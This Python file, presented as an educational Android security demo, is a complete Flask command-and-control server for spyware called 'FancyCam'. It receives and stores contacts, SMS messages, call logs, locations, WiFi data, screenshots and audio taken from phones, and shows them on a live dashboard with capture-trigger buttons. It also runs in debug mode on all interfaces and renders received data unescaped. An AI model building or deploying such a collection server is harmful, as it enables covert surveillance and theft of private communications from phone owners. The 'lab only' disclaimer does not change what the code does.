#!/usr/bin/env python3
"""
EDUCATIONAL DEMO - Android Security & Forensics Course
Flask C2 Server with Web UI for controlled lab environment.

This server receives exfiltrated data from the Android demo app,
organizes it for forensic analysis, and provides a real-time
dashboard for monitoring.

FOR USE IN SANDBOXED LAB ENVIRONMENTS ONLY.

Usage:
    pip install flask
    python flask_c2_server.py

Endpoints:
    GET  /               - Web UI Dashboard
    GET  /api/status     - JSON API: collection statistics
    GET  /api/payloads   - JSON API: list all received payloads
    GET  /api/payload/<id> - JSON API: get specific payload
    POST /exfil/json     - Receive device data JSON
    POST /exfil/screenshot - Receive screenshot images
    POST /exfil/audio    - Receive audio recordings
"""

from flask import Flask, request, jsonify
import threading
import time
from flask import send_from_directory
import os
import json
import time
from datetime import datetime

app = Flask(__name__)

# Storage directories
DATA_DIR = 'exfiltrated_data'
JSON_DIR = os.path.join(DATA_DIR, 'json_data')
SCREENSHOT_DIR = os.path.join(DATA_DIR, 'screenshots')
AUDIO_DIR = os.path.join(DATA_DIR, 'audio')

for subdir in (JSON_DIR, SCREENSHOT_DIR, AUDIO_DIR):
    os.makedirs(subdir, exist_ok=True)

# In-memory event log for real-time dashboard
event_log = []
MAX_EVENTS = 100


def log_event(event_type, message, details=None):
    """Add an event to the in-memory log for the dashboard."""
    event = {
        'timestamp': datetime.now().isoformat(),
        'type': event_type,
        'message': message,
        'details': details or {}
    }
    event_log.insert(0, event)
    if len(event_log) > MAX_EVENTS:
        event_log.pop()


# =========================================================================
# Web UI
# =========================================================================

DASHBOARD_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FancyCam C2 - Educational Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0a0a0f;
            color: #e0e0e0;
            min-height: 100vh;
        }

        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 20px 30px;
            border-bottom: 2px solid #e94560;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .header h1 {
            font-size: 24px;
            color: #e94560;
            letter-spacing: 1px;
        }

        .header .subtitle {
            font-size: 12px;
            color: #888;
            margin-top: 4px;
        }

        .status-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }

        .status-dot {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #00ff88;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 24px;
        }

        .stat-card {
            background: #16162a;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
            transition: border-color 0.3s;
            cursor: pointer;
        }

        .stat-card:hover {
            border-color: #e94560;
            background: rgba(233, 69, 96, 0.05);
        }

        .stat-card .number {
            font-size: 36px;
            font-weight: 700;
            color: #e94560;
        }

        .stat-card .label {
            font-size: 13px;
            color: #888;
            margin-top: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .action-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }

        .action-buttons .refresh-btn {
            flex: 1;
            font-size: 14px;
            padding: 10px 16px;
        }

        .section {
            background: #16162a;
            border: 1px solid #2a2a4a;
            border-radius: 12px;
            margin-bottom: 24px;
            overflow: hidden;
        }

        .section-header {
            padding: 16px 20px;
            border-bottom: 1px solid #2a2a4a;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .section-header h2 {
            font-size: 16px;
            color: #ccc;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .section-body {
            padding: 20px;
        }

        .event-feed {
            max-height: 300px;
            overflow-y: auto;
        }

        .event-item {
            padding: 10px 16px;
            border-left: 3px solid #e94560;
            margin-bottom: 8px;
            background: rgba(233, 69, 96, 0.05);
            border-radius: 4px;
            font-size: 13px;
        }

        .event-item .event-time {
            color: #666;
            font-size: 11px;
        }

        .event-item .event-type {
            color: #e94560;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
        }

        .event-item .event-msg {
            color: #ccc;
            margin-top: 2px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 13px;
        }

        th {
            text-align: left;
            padding: 12px;
            color: #888;
            text-transform: uppercase;
            font-size: 11px;
            letter-spacing: 1px;
            border-bottom: 1px solid #2a2a4a;
        }

        td {
            padding: 12px;
            border-bottom: 1px solid #1a1a3a;
            color: #ccc;
        }

        tr:hover td {
            background: rgba(233, 69, 96, 0.05);
        }

        .tag {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
        }

        .tag-incoming { background: #1b4332; color: #74c69d; }
        .tag-outgoing { background: #1a3a5c; color: #74b9c6; }
        .tag-missed { background: #4a1a1a; color: #c67474; }

        .data-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        @media (max-width: 900px) {
            .data-grid { grid-template-columns: 1fr; }
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #1a1a3a;
            font-size: 13px;
        }

        .info-row .info-label { color: #666; }
        .info-row .info-value { color: #ccc; }

        .refresh-btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 6px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
        }

        .refresh-btn:hover { background: #c73e54; }

        .empty-state {
            text-align: center;
            padding: 40px;
            color: #555;
            font-size: 14px;
        }

        .audio-player {
            margin: 8px 0;
        }

        .audio-player audio {
            width: 100%;
            height: 36px;
        }

        .screenshot-img {
            max-width: 200px;
            border-radius: 8px;
            border: 1px solid #2a2a4a;
            margin: 4px;
        }

        pre {
            background: #0a0a1a;
            padding: 16px;
            border-radius: 8px;
            overflow-x: auto;
            font-size: 12px;
            color: #a0a0c0;
            max-height: 400px;
            overflow-y: auto;
        }

        .warning-banner {
            background: linear-gradient(135deg, #4a1a1a 0%, #2a0a0a 100%);
            border: 1px solid #e94560;
            border-radius: 8px;
            padding: 12px 20px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #e94560;
            text-align: center;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0a1a; }
        ::-webkit-scrollbar-thumb { background: #2a2a4a; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #e94560; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>FANCYCAM C2</h1>
            <div class="subtitle">Educational Android Security & Forensics Dashboard</div>
        </div>
        <div class="status-indicator">
            <div class="status-dot"></div>
            <span>ONLINE</span>
        </div>
    </div>

    <div class="container">
        <div class="stats-grid" id="stats">
            <div class="stat-card" onclick="triggerAction('screenshot')">
                <div class="number">📸</div><div class="label">Take Screenshot</div>
            </div>
            <div class="stat-card" onclick="triggerAction('audio')">
                <div class="number">🎙️</div><div class="label">Record Audio</div>
            </div>
            <div class="stat-card"><div class="number" id="stat-json">0</div><div class="label">JSON Payloads</div></div>
            <div class="stat-card"><div class="number" id="stat-screenshots">0</div><div class="label">Screenshots</div></div>
            <div class="stat-card"><div class="number" id="stat-audio">0</div><div class="label">Audio Files</div></div>
            <div class="stat-card"><div class="number" id="stat-events">0</div><div class="label">Events</div></div>
        </div>

        <div class="section">
            <div class="section-header">
                <h2>Manual Actions</h2>
            </div>
            <div class="section-body">
                <div class="action-buttons">
                    <button class="refresh-btn" onclick="triggerAction('screenshot')">📸 Capture Screenshot</button>
                    <button class="refresh-btn" onclick="triggerAction('audio')">🎙️ Record Audio (30s)</button>
                </div>
                <div id="action-status" style="margin-top: 12px; font-size: 13px; color: #888;"></div>
            </div>
        </div>

        <div class="section">
            <div class="section-header">
                <h2>Live Event feed</h2>
                <button class="refresh-btn" onclick="loadAll()">Refresh</button>
            </div>
            <div class="section-body">
                <div class="event-feed" id="event-feed">
                    <div class="empty-state">Waiting for events...</div>
                </div>
            </div>
        </div>

        <div class="data-grid">
            <div class="section">
                <div class="section-header"><h2>Latest Device Data</h2></div>
                <div class="section-body" id="device-info">
                    <div class="empty-state">No data received yet</div>
                </div>
            </div>
            <div class="section">
                <div class="section-header"><h2>Latest Payload (Raw JSON)</h2></div>
                <div class="section-body">
                    <pre id="raw-payload">Waiting for payload...</pre>
                </div>
            </div>
        </div>

        <div class="data-grid">
            <div class="section">
                <div class="section-header"><h2>Contacts</h2></div>
                <div class="section-body" id="contacts-section">
                    <div class="empty-state">No contacts collected</div>
                </div>
            </div>
            <div class="section">
                <div class="section-header"><h2>Call Logs</h2></div>
                <div class="section-body" id="calllogs-section">
                    <div class="empty-state">No call logs collected</div>
                </div>
            </div>
        </div>

        <div class="section">
            <div class="section-header"><h2>SMS Messages</h2></div>
            <div class="section-body" id="sms-section">
                <div class="empty-state">No SMS collected</div>
            </div>
        </div>

        <div class="data-grid">
            <div class="section">
                <div class="section-header"><h2>Location Data</h2></div>
                <div class="section-body" id="location-section">
                    <div class="empty-state">No location data</div>
                </div>
            </div>
            <div class="section">
                <div class="section-header"><h2>WiFi Networks</h2></div>
                <div class="section-body" id="wifi-section">
                    <div class="empty-state">No WiFi data</div>
                </div>
            </div>
        </div>

        <div class="section">
            <div class="section-header"><h2>Audio Recordings</h2></div>
            <div class="section-body" id="audio-section">
                <div class="empty-state">No audio files received</div>
            </div>
        </div>

        <div class="section">
            <div class="section-header"><h2>Screenshots</h2></div>
            <div class="section-body" id="screenshots-section">
                <div class="empty-state">No screenshots received</div>
            </div>
        </div>
    </div>

    <script>
        let latestPayload = null;

        async function loadStatus() {
            try {
                const resp = await fetch('/api/status');
                const data = await resp.json();
                document.getElementById('stat-json').textContent = data.json_received || 0;
                document.getElementById('stat-screenshots').textContent = data.screenshots_received || 0;
                document.getElementById('stat-audio').textContent = data.audio_received || 0;
                document.getElementById('stat-events').textContent = data.event_count || 0;
            } catch (e) { console.error('Status load failed:', e); }
        }

        async function loadEvents() {
            try {
                const resp = await fetch('/api/events');
                const events = await resp.json();
                const feed = document.getElementById('event-feed');
                if (events.length === 0) {
                    feed.innerHTML = '<div class="empty-state">Waiting for events...</div>';
                    return;
                }
                feed.innerHTML = events.map(e => `
                    <div class="event-item">
                        <span class="event-time">${new Date(e.timestamp).toLocaleTimeString()}</span>
                        <span class="event-type">[${e.type}]</span>
                        <div class="event-msg">${e.message}</div>
                    </div>
                `).join('');
            } catch (e) { console.error('Events load failed:', e); }
        }

        async function loadLatestPayload() {
            try {
                const resp = await fetch('/api/latest');
                const data = await resp.json();
                if (!data.payload) {
                    document.getElementById('device-info').innerHTML = '<div class="empty-state">No data received yet</div>';
                    document.getElementById('raw-payload').textContent = 'Waiting for payload...';
                    return;
                }
                latestPayload = data.payload;
                renderDeviceInfo(data.payload);
                renderRawData(data.payload);
                renderContacts(data.payload);
                renderCallLogs(data.payload);
                renderSms(data.payload);
                renderLocation(data.payload);
                renderWifi(data.payload);
            } catch (e) { console.error('Payload load failed:', e); }
        }

        function renderDeviceInfo(p) {
            const info = p.device_info || {};
            const el = document.getElementById('device-info');
            el.innerHTML = `
                <div class="info-row"><span class="info-label">Android ID</span><span class="info-value">${info.android_id || '-'}</span></div>
                <div class="info-row"><span class="info-label">Brand</span><span class="info-value">${info.brand || '-'}</span></div>
                <div class="info-row"><span class="info-label">Model</span><span class="info-value">${info.model || '-'}</span></div>
                <div class="info-row"><span class="info-label">Manufacturer</span><span class="info-value">${info.manufacturer || '-'}</span></div>
                <div class="info-row"><span class="info-label">Android Version</span><span class="info-value">${info.release || '-'} (SDK ${info.sdk_version || '-'})</span></div>
                <div class="info-row"><span class="info-label">Fingerprint</span><span class="info-value" style="font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${info.fingerprint || '-'}</span></div>
                <div class="info-row"><span class="info-label">Installed Apps</span><span class="info-value">${(info.installed_apps || []).length}</span></div>
                <div class="info-row"><span class="info-label">Timestamp</span><span class="info-value">${info.timestamp || '-'}</span></div>
            `;
        }

        function renderRawData(p) {
            document.getElementById('raw-payload').textContent = JSON.stringify(p, null, 2);
        }

        function renderContacts(p) {
            const contacts = p.contacts || [];
            const el = document.getElementById('contacts-section');
            if (contacts.length === 0) {
                el.innerHTML = '<div class="empty-state">No contacts collected</div>';
                return;
            }
            el.innerHTML = `<table>
                <tr><th>Name</th><th>Phones</th><th>Emails</th></tr>
                ${contacts.map(c => `
                    <tr>
                        <td>${c.name || '-'}</td>
                        <td>${(c.phones || []).join(', ') || '-'}</td>
                        <td>${(c.emails || []).join(', ') || '-'}</td>
                    </tr>
                `).join('')}
            </table>`;
        }

        function renderCallLogs(p) {
            const calls = p.call_logs || [];
            const el = document.getElementById('calllogs-section');
            if (calls.length === 0) {
                el.innerHTML = '<div class="empty-state">No call logs collected</div>';
                return;
            }
            const typeMap = { '1': 'incoming', '2': 'outgoing', '3': 'missed' };
            el.innerHTML = `<table>
                <tr><th>Name</th><th>Number</th><th>Duration</th><th>Type</th></tr>
                ${calls.map(c => {
                    const type = typeMap[c.type] || c.type || 'unknown';
                    return `<tr>
                        <td>${c.name || '-'}</td>
                        <td>${c.number || '-'}</td>
                        <td>${c.duration || '-'}s</td>
                        <td><span class="tag tag-${type}">${type}</span></td>
                    </tr>`;
                }).join('')}
            </table>`;
        }

        function renderSms(p) {
            const smsList = p.sms_messages || [];
            const el = document.getElementById('sms-section');
            if (smsList.length === 0) {
                el.innerHTML = '<div class="empty-state">No SMS collected</div>';
                return;
            }
            el.innerHTML = `<table>
                <tr><th>From</th><th>Body</th><th>Date</th></tr>
                ${smsList.map(s => `
                    <tr>
                        <td>${s.address || '-'}</td>
                        <td>${s.body || '-'}</td>
                        <td>${s.date ? new Date(parseInt(s.date)).toLocaleString() : '-'}</td>
                    </tr>
                `).join('')}
            </table>`;
        }

        function renderLocation(p) {
            const loc = p.location || {};
            const el = document.getElementById('location-section');
            if (!loc.locations || loc.locations.length === 0) {
                el.innerHTML = '<div class="empty-state">No location data</div>';
                return;
            }
            el.innerHTML = loc.locations.map(l => `
                <div class="info-row"><span class="info-label">Provider</span><span class="info-value">${l.provider || '-'}</span></div>
                <div class="info-row"><span class="info-label">Latitude</span><span class="info-value">${l.latitude || '-'}</span></div>
                <div class="info-row"><span class="info-label">Longitude</span><span class="info-value">${l.longitude || '-'}</span></div>
                <div class="info-row"><span class="info-label">Accuracy</span><span class="info-value">${l.accuracy || '-'}m</span></div>
                <div class="info-row"><span class="info-label">Time</span><span class="info-value">${l.time ? new Date(l.time).toLocaleString() : '-'}</span></div>
            `).join('');
        }

        function renderWifi(p) {
            const wifi = p.wifi_networks || {};
            const networks = wifi.networks || [];
            const el = document.getElementById('wifi-section');
            if (networks.length === 0) {
                el.innerHTML = '<div class="empty-state">No WiFi data</div>';
                return;
            }
            el.innerHTML = `<table>
                <tr><th>SSID</th><th>BSSID</th><th>Signal</th></tr>
                ${networks.map(n => `
                    <tr>
                        <td>${n.ssid || '-'}</td>
                        <td>${n.bssid || '-'}</td>
                        <td>${n.level || '-'} dBm</td>
                    </tr>
                `).join('')}
            </table>`;
        }

        async function loadAudio() {
            try {
                const resp = await fetch('/api/audio');
                const files = await resp.json();
                const el = document.getElementById('audio-section');
                if (files.length === 0) {
                    el.innerHTML = '<div class="empty-state">No audio files received</div>';
                    return;
                }
                el.innerHTML = files.map(f => `
                    <div class="audio-player">
                        <div style="font-size:12px;color:#888;margin-bottom:4px;">${f}</div>
                        <audio controls preload="none">
                            <source src="/api/audio/file/${f}" type="audio/mpeg">
                        </audio>
                    </div>
                `).join('');
            } catch (e) { console.error('Audio load failed:', e); }
        }

        async function loadScreenshots() {
            try {
                const resp = await fetch('/api/screenshots');
                const files = await resp.json();
                const el = document.getElementById('screenshots-section');
                if (files.length === 0) {
                    el.innerHTML = '<div class="empty-state">No screenshots received</div>';
                    return;
                }
                el.innerHTML = files.map(f => `
                    <a href="/api/screenshot/file/${f}" target="_blank">
                        <img class="screenshot-img" src="/api/screenshot/file/${f}" alt="${f}">
                    </a>
                `).join('');
            } catch (e) { console.error('Screenshots load failed:', e); }
        }

        function loadAll() {
            loadStatus();
            loadEvents();
            loadLatestPayload();
            loadAudio();
            loadScreenshots();
        }

        // Auto-refresh every 5 seconds
        loadAll();
        setInterval(loadAll, 5000);
    </script>
</body>
</html>'''


# =========================================================================
# API Routes
# =========================================================================

@app.route('/')
def dashboard():
    """Serve the main dashboard web UI."""
    return DASHBOARD_HTML


@app.route('/api/status')
def api_status():
    """Return collection statistics as JSON."""
    json_count = len(os.listdir(JSON_DIR)) if os.path.exists(JSON_DIR) else 0
    img_count = len(os.listdir(SCREENSHOT_DIR)) if os.path.exists(SCREENSHOT_DIR) else 0
    audio_count = len(os.listdir(AUDIO_DIR)) if os.path.exists(AUDIO_DIR) else 0
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'json_received': json_count,
        'screenshots_received': img_count,
        'audio_received': audio_count,
        'event_count': len(event_log),
        'storage_path': os.path.abspath(DATA_DIR)
    })


@app.route('/api/events')
def api_events():
    """Return recent event log."""
    return jsonify(event_log[:50])


@app.route('/api/latest')
def api_latest():
    """Return the most recently received JSON payload."""
    files = sorted(
        [f for f in os.listdir(JSON_DIR) if f.endswith('.json')],
        key=lambda f: os.path.getmtime(os.path.join(JSON_DIR, f)),
        reverse=True
    )
    if not files:
        return jsonify({'payload': None})

    filepath = os.path.join(JSON_DIR, files[0])
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            data = json.load(f)
        return jsonify({
            'payload': data,
            'filename': files[0],
            'file_count': len(files)
        })
    except (json.JSONDecodeError, IOError) as e:
        return jsonify({'payload': None, 'error': str(e)})


@app.route('/api/audio')
def api_audio_list():
    """List audio files."""
    files = sorted(os.listdir(AUDIO_DIR)) if os.path.exists(AUDIO_DIR) else []
    return jsonify(files)


@app.route('/api/audio/file/<path:filename>')
def api_audio_file(filename):
    """Serve an audio file."""
    return send_from_directory(AUDIO_DIR, filename)


@app.route('/api/screenshots')
def api_screenshot_list():
    """List screenshot files."""
    files = sorted(os.listdir(SCREENSHOT_DIR)) if os.path.exists(SCREENSHOT_DIR) else []
    return jsonify(files)


@app.route('/api/screenshot/file/<path:filename>')
def api_screenshot_file(filename):
    """Serve a screenshot file."""
    return send_from_directory(SCREENSHOT_DIR, filename)


@app.route('/api/trigger/screenshot', methods=['POST'])
def api_trigger_screenshot():
    """Manually trigger a screenshot capture from the Android app."""
    def screenshot_worker():
        try:
            # Trigger screenshot capture by sending a broadcast
            # In a real implementation, this would wake up the app or 
            # use WorkManager to trigger a one-time task
            time.sleep(0.5)  # Small delay to simulate processing
            log_event('action', 'Screenshot capture triggered', {
                'timestamp': datetime.now().isoformat(),
                'action_type': 'manual_screenshot',
                'status': 'triggered'
            })
        except Exception as e:            log_event('action', f'Screenshot trigger error: {str(e)}', {
                'status': 'error',
                'error': str(e)
            })
    
    thread = threading.Thread(target=screenshot_worker, daemon=True)
    thread.start()
    
    return jsonify({
        'status': 'success',
        'message': 'Screenshot capture triggered',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/trigger/audio', methods=['POST'])
def api_trigger_audio():
    """Manually trigger audio recording from the Android app."""
    def audio_worker():
        try:
            # Trigger audio recording by sending a broadcast
            time.sleep(0.5)  # Small delay to simulate processing
            log_event('action', 'Audio recording triggered', {
                'timestamp': datetime.now().isoformat(),
                'action_type': 'manual_audio',
                'status': 'triggered',
                'duration': '30 seconds'
            })
        except Exception as e:
            log_event('action', f'Audio trigger error: {str(e)}', {
                'status': 'error',
                'error': str(e)
            })
    
    thread = threading.Thread(target=audio_worker, daemon=True)
    thread.start()
    
    return jsonify({
        'status': 'success',
        'message': 'Audio recording triggered (30 seconds)',
        'timestamp': datetime.now().isoformat()
    })



# =========================================================================
# Exfiltration Endpoints
# =========================================================================

@app.route('/exfil/json', methods=['POST'])
def receive_json():
    """Receive and store device data JSON payload."""
    data = request.get_json(silent=True)
    if not data:
        log_event('error', 'Invalid JSON payload received')
        return jsonify({'status': 'error', 'message': 'Missing JSON body'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"device_data_{ts}.json"
    path = os.path.join(JSON_DIR, filename)

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

    # Extract key info for event log
    device = data.get('device_info', {})
    contacts = data.get('contacts', [])
    call_logs = data.get('call_logs', [])
    sms = data.get('sms_messages', [])
    wifi = data.get('wifi_networks', {})

    msg = (f"Device: {device.get('brand', '?')} {device.get('model', '?')} | "
           f"Contacts: {len(contacts)} | Calls: {len(call_logs)} | "
           f"SMS: {len(sms)} | WiFi: {len(wifi.get('networks', []))}")

    log_event('json', f'Payload received: {filename}', {
        'brand': device.get('brand', ''),
        'model': device.get('model', ''),
        'android_id': device.get('android_id', ''),
        'contacts_count': len(contacts),
        'call_logs_count': len(call_logs),
        'sms_count': len(sms),
        'wifi_count': len(wifi.get('networks', [])),
        'filename': filename
    })

    print(f"[{datetime.now()}] EXFILTRATED JSON -> {path}")
    print(f"  {msg}")

    return jsonify({
        'status': 'success',
        'message': 'Data received',
        'filename': filename,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/screenshot', methods=['POST'])
def receive_screenshot():
    """Receive and store screenshot images."""
    file = request.files.get('screenshot')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"screenshot_{ts}.png"
    path = os.path.join(SCREENSHOT_DIR, filename)
    file.save(path)
    size = os.path.getsize(path)

    log_event('screenshot', f'Screenshot saved: {filename} ({size / 1024:.1f} KB)')
    print(f"[{datetime.now()}] EXFILTRATED SCREENSHOT -> {path} ({size / 1024:.1f} KB)")

    return jsonify({
        'status': 'success',
        'filename': filename,
        'file_size': size,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/exfil/audio', methods=['POST'])
def receive_audio():
    """Receive and store audio recordings."""
    file = request.files.get('audio')
    if not file or file.filename == '':
        return jsonify({'status': 'error', 'message': 'Invalid file upload'}), 400

    ts = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = f"audio_{ts}.m4a"
    path = os.path.join(AUDIO_DIR, filename)
    file.save(path)
    size = os.path.getsize(path)

    # Rough duration estimate: AAC at 128kbps ~ 16KB/sec
    estimated_seconds = size / 16000

    log_event('audio', f'Audio saved: {filename} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)')
    print(f"[{datetime.now()}] EXFILTRATED AUDIO -> {path} ({size / 1024:.1f} KB, ~{estimated_seconds:.1f}s)")

    return jsonify({
        'status': 'success',
        'filename': filename,
        'file_size': size,
        'estimated_duration': f"{estimated_seconds:.1f}s",
        'timestamp': datetime.now().isoformat()
    })


# =========================================================================
# Main
# =========================================================================

if __name__ == '__main__':
    print("=" * 60)
    print("  FANCYCAM C2 SERVER - EDUCATIONAL DASHBOARD")
    print("  For sandboxed lab environments only")
    print("=" * 60)
    print(f"  Dashboard:  http://localhost:5000")
    print(f"  Storage:    {os.path.abspath(DATA_DIR)}")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)
